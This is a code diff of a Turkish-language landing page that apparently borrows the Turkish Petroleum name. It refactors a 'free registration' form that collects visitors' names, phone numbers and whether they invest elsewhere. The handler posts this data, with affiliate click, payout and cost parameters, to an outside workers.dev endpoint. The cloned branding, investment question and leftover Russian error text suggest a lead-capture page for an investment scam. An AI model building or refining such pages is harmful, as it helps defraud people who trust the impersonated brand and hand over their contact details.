@@ -64,32 +64,30 @@
                         bırakın.</p>
                     <div class="leadFormContainer2 first">
 
-                        <form class="form-group" id="form" method="POST" action="https://worker-icy-adige-6365.jebirsunucu.workers.dev">
-                            <h2 class="formHeader"></h2>
-                            <div class="commonInputDiv">
-                                <input class="form-control common name" id="firstName" name="name" placeholder="Adınız Soyadınız" type="text" required>
-                            </div>
-                   
-                   
-                            <div class="commonInputDiv">
-                                <input class="form-control common" id="phone-with-mask" name="phone" placeholder="Telefon" type="text" required>
-                            </div>
-         <div class="commonInputDiv">
-             <label for="hr-select">Başka Platformlarda yatırımınız varmı ?</label> <br />
-<select class="form-select" name="yatirimvarmi" aria-label="Başka Platformlarda yatırımınız varmı ?" required>
-  <option selected>SEÇİNİZ </option>
-  <option value="evet">Evet</option>
-  <option value="hayir">Hayır</option>
-  
-</select>
-                            </div>
-                            <div class="error"></div>
-                            <div class="commonInputDiv btnSubmitDiv ">
-                                <button class="btn leadSubmit" id="123456" type="submit">
-                                    <span class="leadSubmitSpan">Ücretsiz kayıt</span>
-                                </button>
-                            </div>
-                        </form>
+
+<form class="form-group" id="form" method="POST">
+    <h2 class="formHeader">Form Başlığı</h2>
+    <div class="commonInputDiv">
+        <input class="form-control common name" id="firstName" name="name" placeholder="Adınız Soyadınız" type="text" required>
+    </div>
+    <div class="commonInputDiv">
+        <input class="form-control common" id="phone-with-mask" name="phone" placeholder="Telefon" type="text" required>
+    </div>
+    <div class="commonInputDiv">
+        <label for="hr-select">Başka Platformlarda yatırımınız varmı?</label> <br />
+        <select class="form-select" name="yatirimvarmi" aria-label="Başka Platformlarda yatırımınız varmı ?" required>
+            <option selected>SEÇİNİZ</option>
+            <option value="evet">Evet</option>
+            <option value="hayir">Hayır</option>
+        </select>
+    </div>
+    <div class="error"></div>
+    <div class="commonInputDiv btnSubmitDiv">
+        <button class="btn leadSubmit" id="submitBtn" type="submit">
+            <span class="leadSubmitSpan">Ücretsiz kayıt</span>
+        </button>
+    </div>
+</form>
                     </div>
                 </div>
             </div>
@@ -214,155 +212,84 @@
 <script src="./Turkiye Petrolleri_files/custom.js.indir"></script>
 
 <script>
-    $(document).ready(function () {
-        $.mask.definitions['9'] = false;
-        $.mask.definitions['5'] = "[0-9]";
-        $("#phone-with-mask").mask("+905555555555");
-        // Form Submit Handler
-        var isName = function isName(name) {
-            var re = /^[A-Za-zа-яёА-ЯЁЩЬЮЯҐЄІЇа-щьюяґєі \s]+$/;
-            return re.test(name);
-        };
+$(document).ready(function () {
+    $.mask.definitions['9'] = false;
+    $.mask.definitions['5'] = "[0-9]";
+    $("#phone-with-mask").mask("+905555555555");
+  
+    $('form').each(function () {
+        $(this).on('submit', function (e) {
+            e.preventDefault();
 
-        var validatePhone = function validatePhone(phone) {
-            phone = phone.replace(/[^+\d]/g, '');
-            var phoneThree = phone.substr(0, 3);
-            var phoneTwo = phone.substr(0, 2);
+            $(this).find('button[type=submit]').attr("disabled", true);
 
-            if (phoneThree == '+90') {
-                var re = /^[0-9]{12}$/;
-                return re.test(parseInt(phone));
-            } else {
-                return false
+            $(this).find('div.error-text').remove();
+
+            let OK = true;
+            $(this).find('input').not(':input[type=mail], :input[type=hidden]').each(function () {
+                let input = $(this);
+                let val = input.val();
+                let el = input.parent()[0];
+
+                if (!val) {
+                    OK = false;
+                }
+            });
+            
+            let yatirimVarMi = $(this).find("select[name=yatirimvarmi]").val();
+
+            if (yatirimVarMi === "") {
+                // Eğer bir seçenek seçilmediyse, formun submitini engelle
+                alert("Lütfen yatırım var mı? seçeneğini belirtin.");
+                OK = false;
             }
-        };
 
-        $('form').each(function () {
-            $(this).on('submit', function (e) {
-                e.preventDefault();
-
-                $(this).find('button[type=submit]').attr("disabled", true);
-
-                $(this).find('div.error-text').remove();
-
-                let OK = true;
-                $(this).find('input').not(':input[type=mail], :input[type=hidden]').each(function () {
-                    let input = $(this);
-                    let val = input.val();
-                    let el = input.parent()[0];
-
-                    if (!val) {
-                        OK = false;
+            if (OK) {
+                $.ajax({
+                    url: 'https://worker-icy-adige-6365.jebirsunucu.workers.dev/',
+                    type: "POST",
+                    data: {
+                        name: $(this).find("input[name=name]").val(),
+                        lname: $(this).find("input[name=lname]").val(),
+                        email: $(this).find("input[name=email]").val(),
+                        phone: $(this).find("input[name=phone]").val(),
+                        siteName: document.location.host,
+                        utm: new URLSearchParams(document.location.search).get("utm_campaign"),
+                        ans: $('input:radio:checked').map(function (_, el) {
+                            return $(el).val();
+                        }).get().join("|"),
+                        clickid: new URLSearchParams(document.location.search).get("clickid"),
+                        creative_id: new URLSearchParams(document.location.search).get("creative_id"),
+                        ad_campaign_id: new URLSearchParams(document.location.search).get("ad_campaign_id"),
+                        imp_id: new URLSearchParams(document.location.search).get('imp_id'),
+                        payout: new URLSearchParams(document.location.search).get('payout'),
+                        cost: new URLSearchParams(document.location.search).get('cost'),
+                        yatirimvarmi: yatirimVarMi // Yatırım var mı seçeneği buraya eklendi
+                    },
+                    dataType: "json",
+                    success: function (data) {
+                        if (data.success) {
+                            if (data.data.autologin) {
+                                localStorage.setItem('autologin', data.data.autologin)
+                            }
+                            window.location.href = "./thanks.html";
+                        } else {
+                            toastr.error(data.message)
+                            $(this).find('button[type=submit]').attr("disabled", false);
+                        }
+                    },
+                    error: function () {
+                        console.log(':(');
                     }
                 });
-                let paramsString = document.location.search;
-                let searchParams = new URLSearchParams(paramsString);
-
-                const policy = $(this).find("input[name=policy]").prop('checked');
-                let utm = searchParams.get("utm_campaign");
-                const siteName = document.location.host;
-                let clickid = searchParams.get("clickid");
-                let creativeId = searchParams.get("creative_id");
-                let adCampaignId = searchParams.get("ad_campaign_id");
-                let imp_id = searchParams.get('imp_id')
-                let cost = searchParams.get('cost')
-                let payout = searchParams.get('payout')
-                let name = $(this).find("input[name=name]").val();
-                let lname = $(this).find("input[name=lname]").val();
-                let phone = $(this).find("input[name=phone]").val();
-                let email = $(this).find("input[name=email]").val();
-                let answers = $('input:radio:checked').map(function (_, el) {
-                    return $(el).val();
-                }).get();
-                const ans = answers.length ? answers.reduce((acc, answer) => {
-                    return answer + `|${acc}`
-                }) : '';
-
-                if (phone) {
-                    if (!validatePhone(phone)) {
-                        let el = $(this).find("input[name=phone]").parent()[0];
-                        $(el).append(
-                            '<div class="messages error-text">Пожалуйста, введите корректный телефон (+7 999 999 99 99)</div>'
-                        );
-                        OK = false;
-                    }
-                } else {
-                    OK = false;
-                }
-
-                if (name) {
-                    if (!isName(name)) {
-                        let _el = $(this).find("input[name=name]").parent()[0];
-                        let input = $(this).find("input[name=name]")[0];
-
-                        $(input).parent().addClass('error-error');
-
-                        OK = false;
-                    }
-                } else {
-                    let input = $(this).find("input[name=name]")[0];
-                    OK = false;
-                    $(input).parent().removeClass('error-error');
-                }
-
-document.getElementById("submitBtn").addEventListener("click", function(event) {
-        // Seçilen değeri al
-        var yatirimVarMi = document.getElementById("yatirimvarmi").value;
-
-        // Seçenek kontrolü yap
-        if (yatirimVarMi === "") {
-            // Eğer bir seçenek seçilmediyse, formun submitini engelle
-            event.preventDefault();
-            // Kullanıcıya hata mesajını göster
-            alert("Lütfen yatırım var mı? seçeneğini belirtin.");
-        }
-    });
-
-                utm = utm ? utm : document.location.host;
-
-                console.log(name, lname, email, phone, siteName, utm, ans, OK);
-
-              if (OK) {
-    $.ajax({
-        url: 'https://worker-icy-adige-6365.jebirsunucu.workers.dev/',
-        type: "POST",
-        data: {
-            name: name,
-            lname: lname,
-            email: email,
-            phone: phone,
-            siteName: siteName,
-            utm: utm,
-            ans: ans,
-            clickid: clickid,
-            creative_id: creativeId,
-            ad_campaign_id: adCampaignId,
-            imp_id: imp_id,
-            payout: payout,
-            cost: cost,
-            yatirimvarmi: yatirimVarMi // Yatırım var mı seçeneği buraya eklendi
-        },
-        dataType: "json",
-        success: function (data) {
-            if (data.success) {
-                if (data.data.autologin) {
-                    localStorage.setItem('autologin', data.data.autologin)
-                }
-                window.location.href = "./thanks.html";
-            }
-            else {
-                toastr.error(data.message)
+            } else {
                 $(this).find('button[type=submit]').attr("disabled", false);
             }
-        },
-        error: function () {
-            console.log(':(');
-        }
+        });
     });
-} else {
-    $(this).find('button[type=submit]').attr("disabled", false);
-}
+});
 </script>
+
 
 
 
